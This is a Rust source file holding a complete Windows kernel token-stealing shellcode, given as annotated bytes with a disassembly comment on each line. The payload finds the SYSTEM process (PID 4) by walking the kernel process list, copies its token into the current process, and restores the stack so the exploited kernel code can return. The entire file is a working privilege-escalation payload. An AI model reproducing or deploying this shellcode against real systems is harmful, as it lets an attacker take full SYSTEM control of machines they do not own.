use byte_strings::concat_bytes;

pub fn token_stealing_shellcode() -> [u8; 85] {
    return concat_bytes!(
        b"\x90",
        b"\x50",                             // 00000000:  push rax
        b"\x51",                             // 00000001:  push rcx
        b"\x52",                             // 00000002:  push rdx
        b"\x48\x31\xc0",                     // 00000003:  xor rax,rax
        b"\x65\x48\x8b\x80\x88\x01\x00\x00", // 00000006:  mov rax,[gs:rax+0x188]
        b"\x48\x8b\x80\xb8\x00\x00\x00",     // 0000000E:  mov rax,[rax+0xb8]
        b"\x48\x89\xc1",                     // 00000015:  mov rcx,rax
        b"\xba\x04\x00\x00\x00",             // 00000018:  mov edx,0x4
        b"\x48\x8b\x80\x48\x04\x00\x00",     // 0000001D:  mov rax,[rax+0x448]
        b"\x48\x2d\x48\x04\x00\x00",         // 00000024:  sub rax,0x448
        b"\x48\x39\x90\x40\x04\x00\x00",     // 0000002A:  cmp [rax+0x440],rdx
        b"\x75\xea",                         // 00000031:  jnz 0x1d
        b"\x48\x8b\x90\xb8\x04\x00\x00",     // 00000033:  mov rdx,[rax+0x4b8]
        b"\x48\x89\x91\xb8\x04\x00\x00",     // 0000003A:  mov [rcx+0x4b8],rdx
        b"\x5a",                             // 00000041:  pop rdx
        b"\x59",                             // 00000042:  pop rcx
        b"\x58",                             // 00000043:  pop rax
        b"\x4d\x31\xe4",                     // 00000044:  xor r12,r12
        b"\x48\x83\xc4\x28",                 // 00000047:  add rsp,byte +0x28
        b"\x4c\x8b\xbc\x24\x88\x00\x00\x00", // 0000004B:  mov r15, [rsp+0x88]
        b"\xc3"                              // 00000053:  ret
    ).clone();
}
